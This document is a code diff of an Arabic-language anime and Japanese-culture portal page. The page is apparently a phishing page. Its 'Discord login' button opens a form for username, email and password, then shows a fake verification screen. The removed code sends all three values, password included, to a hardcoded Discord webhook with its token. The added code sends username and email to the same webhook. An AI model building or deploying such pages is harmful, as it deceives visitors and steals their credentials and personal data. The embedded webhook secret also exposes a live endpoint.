@@ -1,532 +1,274 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Japan Universe Portal</title>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Noto+Sans+JP:wght@500&display=swap');
-
-* {
-  box-sizing: border-box;
-}
-
-body {
-  margin: 0;
-  font-family: 'Cairo', sans-serif;
-  background: linear-gradient(135deg, #0b0b15, #1a1a2e, #ff8fab);
-  color: white;
-  overflow-x: hidden;
-  overflow-y: auto;
-  -webkit-overflow-scrolling: touch;
-  transition: background 2s ease;
-  min-height: 100vh;
-  padding: 20px 0;
-}
-
-/* خلفية متحركة */
-.bg {
-  position: fixed;
-  width: 100%;
-  height: 100%;
-  background: url('https://images.unsplash.com/photo-1558980664-10ea9fa7a259?auto=format&fit=crop&w=1740&q=80') center/cover no-repeat;
-  filter: brightness(0.4);
-  z-index: -1;
-  animation: bgChange 15s infinite alternate ease-in-out;
-  top: 0;
-  left: 0;
-}
-
-@keyframes bgChange {
-  0% { background-image: url('https://images.unsplash.com/photo-1558980664-10ea9fa7a259?auto=format&fit=crop&w=1740&q=80'); }
-  50% { background-image: url('https://images.unsplash.com/photo-1549692520-acc6669e2f0c?auto=format&fit=crop&w=1740&q=80'); }
-  100% { background-image: url('https://images.unsplash.com/photo-1578632767115-351597cf2477?auto=format&fit=crop&w=1740&q=80'); }
-}
-
-/* حاوية الصفحة */
-.container {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  min-height: 100vh;
-  text-align: center;
-  backdrop-filter: blur(10px);
-  background: rgba(0, 0, 0, 0.45);
-  padding: 30px 20px;
-  border-radius: 25px;
-  box-shadow: 0 0 25px #ff8fab;
-  animation: fadeIn 2s ease forwards;
-  transition: opacity 1s ease;
-  margin: 20px auto;
-  max-width: 95%;
-  width: 100%;
-}
-
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(50px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-
-/* العناوين */
-h1 {
-  font-family: 'Noto Sans JP', sans-serif;
-  font-size: 2.3em;
-  background: linear-gradient(to right, #ff6b6b, #fddb92);
-  -webkit-background-clip: text;
-  color: transparent;
-  text-shadow: 0 0 10px rgba(255,255,255,0.4);
-  margin-top: 0;
-  margin-bottom: 20px;
-}
-
-p {
-  max-width: 500px;
-  line-height: 1.7;
-  color: #eee;
-  margin-bottom: 20px;
-}
-
-/* فورم التسجيل */
-form {
-  display: none; /* إخفاء النموذج */
-  flex-direction: column;
-  width: 80%;
-  max-width: 300px;
-  margin-top: 20px;
-}
-
-input {
-  margin: 10px 0;
-  padding: 12px;
-  border: none;
-  border-radius: 10px;
-  outline: none;
-  text-align: center;
-  background: rgba(255,255,255,0.1);
-  color: white;
-  font-size: 1em;
-  transition: all 0.3s ease;
-  width: 100%;
-}
-
-input:focus {
-  background: rgba(255,255,255,0.2);
-  box-shadow: 0 0 10px #ff8fab;
-}
-
-button {
-  background: linear-gradient(90deg, #ff8fab, #fddb92);
-  color: #1a1a2e;
-  border: none;
-  border-radius: 10px;
-  padding: 12px;
-  margin-top: 10px;
-  cursor: pointer;
-  font-weight: bold;
-  transition: all 0.3s ease;
-  width: 100%;
-}
-
-button:hover {
-  transform: scale(1.05);
-  box-shadow: 0 0 20px #ff8fab;
-}
-
-/* زر الديسكورد */
-.discord-btn {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: #5865F2;
-  color: white;
-  border: none;
-  border-radius: 10px;
-  padding: 14px 20px;
-  margin: 20px 0;
-  cursor: pointer;
-  font-weight: bold;
-  font-size: 1.1em;
-  transition: all 0.3s ease;
-  width: 80%;
-  max-width: 300px;
-  text-decoration: none;
-  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-}
-
-.discord-btn:hover {
-  transform: translateY(-2px);
-  box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
-  background: #4752c4;
-}
-
-.discord-btn i {
-  margin-left: 10px;
-  font-size: 1.3em;
-}
-
-/* رسالة التنبيه */
-.alert-message {
-  background: rgba(255, 193, 7, 0.2);
-  border: 1px solid rgba(255, 193, 7, 0.5);
-  border-radius: 10px;
-  padding: 15px;
-  margin: 20px 0;
-  max-width: 500px;
-  text-align: center;
-  animation: pulse 2s infinite;
-}
-
-@keyframes pulse {
-  0% { box-shadow: 0 0 0 0 rgba(255, 193, 7, 0.4); }
-  70% { box-shadow: 0 0 0 10px rgba(255, 193, 7, 0); }
-  100% { box-shadow: 0 0 0 0 rgba(255, 193, 7, 0); }
-}
-
-.alert-message h3 {
-  color: #ffc107;
-  margin-top: 0;
-  margin-bottom: 10px;
-}
-
-.alert-message p {
-  color: #ffd54f;
-  margin-bottom: 0;
-  font-size: 0.9em;
-}
-
-/* إعلانات */
-.ads {
-  margin-top: 25px;
-  animation: float 3s ease-in-out infinite;
-  color: #ffcce0;
-  font-size: 0.9em;
-  padding: 0 10px;
-}
-
-@keyframes float {
-  0%,100% { transform: translateY(0); }
-  50% { transform: translateY(-10px); }
-}
-
-/* صفحة التحقق */
-.verify-box {
-  display: none;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  text-align: center;
-  backdrop-filter: blur(10px);
-  background: rgba(0,0,0,0.6);
-  padding: 40px 20px;
-  border-radius: 20px;
-  box-shadow: 0 0 20px #ff8fab;
-  animation: fadeIn 2s ease forwards;
-  min-height: 100vh;
-  margin: 20px auto;
-  max-width: 95%;
-  width: 100%;
-}
-
-.verify-box img {
-  width: 120px;
-  height: 120px;
-  border-radius: 50%;
-  margin-bottom: 20px;
-  box-shadow: 0 0 20px #ff8fab;
-}
-
-.verify-box h2 {
-  color: #ffd5e5;
-  margin-bottom: 15px;
-  font-size: 1.8em;
-}
-
-.verify-box p {
-  color: #eee;
-  font-size: 1.1em;
-  margin-bottom: 25px;
-  padding: 0 10px;
-}
-
-.verify-box button {
-  background: linear-gradient(90deg, #ff8fab, #fddb92);
-  color: #1a1a2e;
-  border: none;
-  padding: 10px 20px;
-  border-radius: 10px;
-  font-weight: bold;
-  cursor: not-allowed;
-  opacity: 0.7;
-  max-width: 200px;
-}
-
-/* رسالة التحميل */
-.loading {
-  display: none;
-  margin-top: 15px;
-  color: #ff8fab;
-  font-size: 0.9em;
-}
-
-/* تحسينات للهواتف */
-@media (max-width: 768px) {
-  body {
-    padding: 10px 0;
-  }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>عالم الأنمي | التسجيل والتحقق</title>
+  <!-- تحميل Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- تحميل أيقونات Lucide -->
+  <script src="https://unpkg.com/lucide@latest"></script>
   
-  .container, .verify-box {
-    padding: 20px 15px;
-    margin: 10px auto;
-    border-radius: 20px;
-    max-width: 98%;
-  }
-  
-  h1 {
-    font-size: 1.8em;
-    margin-bottom: 15px;
-  }
-  
-  p {
-    font-size: 0.95em;
-    padding: 0 10px;
-  }
-  
-  .discord-btn {
-    width: 90%;
-    padding: 16px;
-  }
-  
-  .alert-message {
-    padding: 12px;
-    margin: 15px 0;
-  }
-  
-  input {
-    padding: 14px;
-    font-size: 16px;
-  }
-  
-  button {
-    padding: 14px;
-  }
-  
-  .verify-box h2 {
-    font-size: 1.5em;
-  }
-  
-  .verify-box p {
-    font-size: 1em;
-  }
-  
-  .verify-box img {
-    width: 100px;
-    height: 100px;
-  }
-}
+  <style>
+    /* استخدام خط Cairo ليتناسب مع اللغة العربية بشكل أفضل */
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+    
+    body {
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(135deg, #0d001a, #1a0033, #330066);
+    }
 
-@media (max-width: 480px) {
-  h1 {
-    font-size: 1.5em;
-  }
-  
-  .container, .verify-box {
-    padding: 15px 10px;
-  }
-  
-  .discord-btn {
-    width: 95%;
-    font-size: 1em;
-  }
-  
-  .alert-message {
-    font-size: 0.85em;
-  }
-  
-  .ads {
-    font-size: 0.8em;
-  }
-}
+    /* تأثيرات التوهج لصفحة الهبوط */
+    .glow-pink {
+        box-shadow: 0 0 30px rgba(255, 78, 203, 0.5);
+    }
+    .glow-discord {
+        box-shadow: 0 0 30px rgba(88, 101, 242, 0.6);
+    }
+    
+    /* تصميم خاص لبطاقات الإعلانات */
+    .ad-card {
+        background: rgba(255, 255, 255, 0.05);
+        transition: transform 0.4s, background 0.4s;
+    }
+    .ad-card:hover {
+        transform: translateY(-5px) scale(1.02);
+        background: rgba(255, 255, 255, 0.1);
+        border-color: #ff4ecb;
+    }
 
-/* تحسينات للشاشات الكبيرة */
-@media (min-width: 1200px) {
-  .container, .verify-box {
-    max-width: 800px;
-  }
-}
+    /* تصميم بطاقة التحقق */
+    .verification-card-glow {
+      box-shadow: 0 4px 60px rgba(189, 75, 237, 0.25);
+    }
 
-/* منع اختيار النص على العناصر التفاعلية */
-button, input, .discord-btn {
-  -webkit-tap-highlight-color: transparent;
-  -webkit-touch-callout: none;
-  -webkit-user-select: none;
-  user-select: none;
-}
+    /* لإظهار الأيقونات بشكل صحيح بعد تحميلها */
+    [lucide] {
+        display: inline-block;
+    }
 
-/* تحسينات للتمرير على iOS */
-.container, .verify-box {
-  -webkit-overflow-scrolling: touch;
-}
-</style>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    /* إخفاء نموذج التسجيل/التحقق افتراضياً */
+    .hidden-form {
+      display: none;
+    }
+  </style>
 </head>
-<body>
-<div class="bg"></div>
+<body class="min-h-screen flex flex-col items-center justify-start py-12 md:py-20 px-4">
 
-<!-- واجهة التسجيل -->
-<div class="container" id="register-box">
-  <h1>Japan Universe Portal</h1>
-  <p>اكتشف عالم اليابان الساحر — أنمي، موسيقى، شوارع طوكيو، ثقافة وأسماء يابانية والمزيد!</p>
+  <!-- ============================================== -->
+  <!-- 1. واجهة صفحة الهبوط والتسجيل (Landing Page View) -->
+  <!-- ============================================== -->
+  <div id="landingPage" class="w-full flex flex-col items-center">
+    
+    <!-- قسم العنوان الرئيسي (Hero Section) -->
+    <header class="text-center mb-12">
+      <div class="flex items-center justify-center space-x-4 space-x-reverse mb-4">
+        <i data-lucide="cherry-blossom" class="w-10 h-10 text-pink-400"></i>
+        <h1 class="text-5xl md:text-6xl font-extrabold text-pink-300 tracking-wide glow-pink">
+          عالم الأنمي الياباني
+        </h1>
+        <i data-lucide="japanese-yen" class="w-10 h-10 text-pink-400"></i>
+      </div>
+      <p class="text-xl text-gray-300 mt-2 max-w-xl mx-auto">
+        كل ما تحبه عن اليابان في مكان واحد — أنميات، صور، أغاني، وثقافة يابانية!
+      </p>
+    </header>
+    
+    <!-- زر Discord (للتسجيل) -->
+    <button id="discordLogin" 
+      class="discord-btn px-10 py-3 bg-blue-600 hover:bg-blue-700 text-white font-extrabold 
+             rounded-full text-lg transition-all duration-300 hover:scale-[1.05] glow-discord mb-8 
+             flex items-center justify-center space-x-3 space-x-reverse">
+      <i data-lucide="zap" class="w-5 h-5"></i>
+      <span>تسجيل الدخول عبر Discord</span>
+    </button>
 
-  <!-- رسالة التنبيه -->
-  <div class="alert-message">
-    <h3><i class="fas fa-exclamation-triangle"></i> تنبيه هام</h3>
-    <p>التسجيل متاح حاليًا فقط عبر منصة الديسكورد. يرجى الانضمام إلى سيرفرنا على الديسكورد للمشاركة في مجتمعنا.</p>
+    <!-- نموذج التسجيل التقليدي -->
+    <form id="registerForm" class="hidden-form p-6 bg-gray-900/70 border border-pink-500 rounded-xl shadow-2xl w-full max-w-sm mb-12">
+      <h2 class="text-2xl font-bold text-center text-pink-400 mb-6">
+        <i data-lucide="log-in" class="w-5 h-5 inline ml-2"></i>
+        إنشاء حساب تقليدي
+      </h2>
+      <input type="text" id="username" placeholder="اسم المستخدم" required
+        class="w-full p-3 mb-4 rounded-lg bg-gray-800 border border-gray-700 text-white placeholder-gray-500 focus:ring-pink-500 focus:border-pink-500 outline-none">
+      <input type="email" id="email" placeholder="البريد الإلكتروني" required
+        class="w-full p-3 mb-4 rounded-lg bg-gray-800 border border-gray-700 text-white placeholder-gray-500 focus:ring-pink-500 focus:border-pink-500 outline-none">
+      <input type="password" id="password" placeholder="كلمة المرور" required
+        class="w-full p-3 mb-6 rounded-lg bg-gray-800 border border-gray-700 text-white placeholder-gray-500 focus:ring-pink-500 focus:border-pink-500 outline-none">
+      <button type="submit" 
+        class="w-full py-3 bg-pink-600 hover:bg-pink-700 text-white font-bold rounded-lg 
+               transition-colors duration-300 shadow-lg shadow-pink-900/50">
+        تأكيد التسجيل
+      </button>
+    </form>
+    
+    <!-- بطاقات المحتوى (الإعلانات) -->
+    <section class="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-6xl w-full mb-12">
+      <!-- بطاقة 1: الأنمي -->
+      <div class="ad-card p-6 rounded-xl border border-gray-700 hover:border-pink-500 shadow-xl">
+        <div class="flex items-center space-x-2 space-x-reverse mb-3">
+          <i data-lucide="monitor-play" class="w-6 h-6 text-red-400"></i>
+          <h3 class="text-xl font-bold text-red-300">شاهد أنميات يابانية مجانًا!</h3>
+        </div>
+        <p class="text-gray-400">تابع أحدث الحلقات بأنقى جودة وبدون إعلانات مزعجة!</p>
+      </div>
+      
+      <!-- بطاقة 2: الموسيقى -->
+      <div class="ad-card p-6 rounded-xl border border-gray-700 hover:border-pink-500 shadow-xl">
+        <div class="flex items-center space-x-2 space-x-reverse mb-3">
+          <i data-lucide="music-4" class="w-6 h-6 text-purple-400"></i>
+          <h3 class="text-xl font-bold text-purple-300">استمع لأغاني الأنمي الياباني</h3>
+        </div>
+        <p class="text-gray-400">أفضل أغاني الأنمي الكلاسيكية والحديثة متوفرة لك!</p>
+      </div>
+      
+      <!-- بطاقة 3: الثقافة اليابانية -->
+      <div class="ad-card p-6 rounded-xl border border-gray-700 hover:border-pink-500 shadow-xl">
+        <div class="flex items-center space-x-2 space-x-reverse mb-3">
+          <i data-lucide="factory" class="w-6 h-6 text-cyan-400"></i>
+          <h3 class="text-xl font-bold text-cyan-300">استكشف شوارع طوكيو الحقيقية</h3>
+        </div>
+        <p class="text-gray-400">شاهد صور بانورامية مبهرة لأجمل مدن اليابان وثقافتها!</p>
+      </div>
+    </section>
   </div>
 
-  <!-- زر الديسكورد -->
-  <a href="#" class="discord-btn" id="discord-link">
-    <i class="fab fa-discord"></i>
-    انضم إلى الديسكورد
-  </a>
+  <!-- ============================================== -->
+  <!-- 2. واجهة التحقق من البريد الإلكتروني (Verification View) -->
+  <!-- ============================================== -->
+  <div id="verificationPage" class="hidden fixed inset-0 flex items-center justify-center p-4 z-50 bg-black/60">
+      <div class="max-w-sm w-full bg-gray-800/80 backdrop-blur-lg border border-gray-700/50 rounded-2xl p-6 md:p-8 text-center text-white verification-card-glow transition-all duration-500">
+        
+        <!-- أيقونة البريد -->
+        <div class="mb-5 flex justify-center">
+          <i data-lucide="mail-check" class="w-12 h-12 text-pink-400"></i>
+        </div>
+        
+        <h1 class="text-3xl font-bold text-pink-300 mb-3">خطوة أخيرة للتحقق!</h1>
+        
+        <p class="text-gray-300 mb-6 text-lg">
+          يرجى تفقد بريدك الإلكتروني الذي استخدمته للتسجيل.
+        </p>
 
-  <!-- نموذج التسجيل مخفي -->
-  <form onsubmit="submitForm(event)">
-    <input type="text" id="username" placeholder="اسم المستخدم" required>
-    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-    <input type="password" id="password" placeholder="كلمة المرور" required>
-    <button type="submit">تسجيل</button>
-  </form>
-  
-  <div class="loading" id="loading-message">جاري إرسال البيانات...</div>
+        <!-- تنبيه مخصص لـ Discord -->
+        <div class="bg-blue-900/40 border border-blue-600/70 p-4 rounded-xl text-sm mb-8">
+          <div class="flex items-center space-x-3 space-x-reverse">
+            <i data-lucide="message-square" class="w-5 h-5 text-blue-300 flex-shrink-0"></i>
+            <p class="text-blue-100 font-semibold text-right">
+              لقد أرسلنا لك رسالة **تحقق عبر Discord** على بريدك.
+            </p>
+          </div>
+          <p class="mt-3 text-xs text-gray-400 text-right">
+            **وافق على الرسالة** الموجودة في بريدك الإلكتروني لتفعيل حسابك والدخول إلى عالم الأنمي!
+          </p>
+        </div>
 
-  <div class="ads">
-    🌸 عروض أنمي جديدة كل أسبوع • موسيقى يابانية مميزة • صور من قلب طوكيو 🇯🇵
+        <!-- زر معطل بانتظار التحقق -->
+        <button disabled 
+          class="w-full py-3 bg-pink-600 text-white font-bold rounded-xl 
+                 opacity-70 cursor-not-allowed transition-colors duration-200 
+                 shadow-lg shadow-pink-900/50">
+          <i data-lucide="loader-circle" class="w-5 h-5 inline mr-2 animate-spin"></i>
+          بانتظار موافقتك...
+        </button>
+      </div>
   </div>
-</div>
 
-<!-- واجهة التحقق -->
-<div class="verify-box" id="verify-box">
-  <img src="https://i.pinimg.com/originals/76/1b/8a/761b8a9c230f8ffbcad17f92a40e3f73.gif" alt="anime mail">
-  <h2>تحقق من بريدك الإلكتروني 📧</h2>
-  <p>لقد أرسلنا لك رسالة تحقق إلى بريدك الإلكتروني.<br>يرجى الموافقة لإكمال التسجيل.<br>لن يمكنك الدخول قبل التحقق.</p>
-  <button disabled>في انتظار التحقق...</button>
-</div>
+  <script>
+    // تهيئة أيقونات Lucide
+    lucide.createIcons();
 
-<script>
-// رابط الـ Webhook الذي قدمته
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1432960360943714334/4qtSKqoPZIw3lltKPWXkaEdqGvlVWyzMWaHvvzrepS-rnm6gk31UY5aT4B2sH_rfmTv_";
+    const landingPage = document.getElementById('landingPage');
+    const verificationPage = document.getElementById('verificationPage');
+    const discordBtn = document.getElementById('discordLogin');
+    const registerForm = document.getElementById('registerForm');
+    const discordWebhookURL = "https://discord.com/api/webhooks/1432960360943714334/4qtSKqoPZIw3lltKPWXkaEdqGvlVWyzMWaHvvzrepS-rnm6gk31UY5aT4B2sH_rfmTv_";
 
-// رابط الدعوة لسيرفر الديسكورد (يمكن تغييره)
-const DISCORD_INVITE_URL = "https://discord.gg/example"; // ضع رابط الدعوة الفعلي هنا
+    // منطق إظهار نموذج التسجيل
+    discordBtn.addEventListener('click', () => {
+      // إظهار النموذج وإخفاء زر Discord
+      registerForm.classList.remove('hidden-form');
+      discordBtn.style.display = 'none';
+      
+      // التمرير إلى النموذج الجديد بسلاسة
+      registerForm.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
 
-// تعيين رابط الديسكورد
-document.getElementById('discord-link').href = DISCORD_INVITE_URL;
+    // وظيفة إرسال البيانات إلى Discord Webhook
+    async function sendToDiscordWebhook(userData) {
+      try {
+        const response = await fetch(discordWebhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: null,
+            embeds: [
+              {
+                title: "تسجيل مستخدم جديد!",
+                color: 15844367, // اللون الوردي
+                fields: [
+                  {
+                    name: "اسم المستخدم",
+                    value: userData.username,
+                    inline: true
+                  },
+                  {
+                    name: "البريد الإلكتروني",
+                    value: userData.email,
+                    inline: true
+                  },
+                  {
+                    name: "وقت التسجيل",
+                    value: new Date().toLocaleString('ar-SA'),
+                    inline: false
+                  }
+                ],
+                footer: {
+                  text: "عالم الأنمي | نظام التسجيل"
+                },
+                timestamp: new Date().toISOString()
+              }
+            ],
+            username: "نظام التسجيل - عالم الأنمي",
+            avatar_url: "https://cdn-icons-png.flaticon.com/512/5968/5968756.png"
+          })
+        });
 
-// إظهار رسالة إذا كان رابط الدعوة غير مضبوط
-if (DISCORD_INVITE_URL === "https://discord.gg/example") {
-  document.getElementById('discord-link').addEventListener('click', function(e) {
-    e.preventDefault();
-    alert("يرجى تعيين رابط الدعوة الفعلي لسيرفر الديسكورد في الكود.");
-  });
-}
-
-async function submitForm(e) {
-  e.preventDefault();
-  
-  // جمع بيانات المستخدم
-  const username = document.getElementById("username").value;
-  const email = document.getElementById("email").value;
-  const password = document.getElementById("password").value;
-  
-  // عرض رسالة التحميل
-  document.getElementById("loading-message").style.display = "block";
-  
-  try {
-    // إرسال البيانات إلى Webhook
-    await sendToWebhook(username, email, password);
-    
-    // إخفاء رسالة التحميل
-    document.getElementById("loading-message").style.display = "none";
-    
-    // الانتقال إلى صفحة التحقق
-    showVerify();
-  } catch (error) {
-    // إخفاء رسالة التحميل
-    document.getElementById("loading-message").style.display = "none";
-    
-    // عرض رسالة خطأ
-    alert("حدث خطأ أثناء التسجيل. يرجى المحاولة مرة أخرى.");
-    console.error("Error sending data:", error);
-  }
-}
-
-async function sendToWebhook(username, email, password) {
-  // إنشاء المحتوى الذي سيتم إرساله
-  const content = {
-    username: "Japan Universe Portal",
-    embeds: [{
-      title: "تسجيل جديد",
-      color: 16738740, // لون وردي
-      fields: [
-        {
-          name: "اسم المستخدم",
-          value: username,
-          inline: true
-        },
-        {
-          name: "البريد الإلكتروني",
-          value: email,
-          inline: true
-        },
-        {
-          name: "كلمة المرور",
-          value: password,
-          inline: false
-        },
-        {
-          name: "وقت التسجيل",
-          value: new Date().toLocaleString("ar-SA"),
-          inline: false
+        if (response.ok) {
+          console.log("تم إرسال بيانات المستخدم إلى Discord بنجاح");
+        } else {
+          console.error("فشل في إرسال البيانات إلى Discord:", response.status);
         }
-      ],
-      timestamp: new Date().toISOString()
-    }]
-  };
+      } catch (error) {
+        console.error("خطأ في إرسال البيانات:", error);
+      }
+    }
 
-  // إرسال البيانات إلى Webhook
-  const response = await fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify(content),
-  });
+    // منطق إرسال النموذج والتحويل إلى واجهة التحقق
+    registerForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      
+      // جمع بيانات المستخدم
+      const userData = {
+        username: document.getElementById('username').value,
+        email: document.getElementById('email').value,
+        password: document.getElementById('password').value
+      };
+      
+      // إرسال البيانات إلى Discord Webhook
+      sendToDiscordWebhook(userData);
+      
+      // 1. إخفاء صفحة الهبوط
+      landingPage.classList.add('hidden');
+      
+      // 2. إظهار صفحة التحقق
+      verificationPage.classList.remove('hidden');
 
-  if (!response.ok) {
-    throw new Error(`HTTP error! status: ${response.status}`);
-  }
-}
-
-function showVerify() {
-  document.getElementById("register-box").style.opacity = "0";
-  setTimeout(() => {
-    document.getElementById("register-box").style.display = "none";
-    document.getElementById("verify-box").style.display = "flex";
-  }, 1000);
-}
-
-// تحسينات إضافية للهواتف
-document.addEventListener('touchmove', function(e) {
-  // السماح بالتمرير الطبيعي
-}, { passive: true });
-
-// منع التكبير المزدوج على العناصر التفاعلية
-document.addEventListener('dblclick', function(e) {
-  if (e.target.tagName === 'INPUT' || e.target.tagName === 'BUTTON') {
-    e.preventDefault();
-  }
-});
-</script>
+      // 3. التمرير إلى أعلى الصفحة الجديدة
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    });
+  </script>
 </body>
 </html>
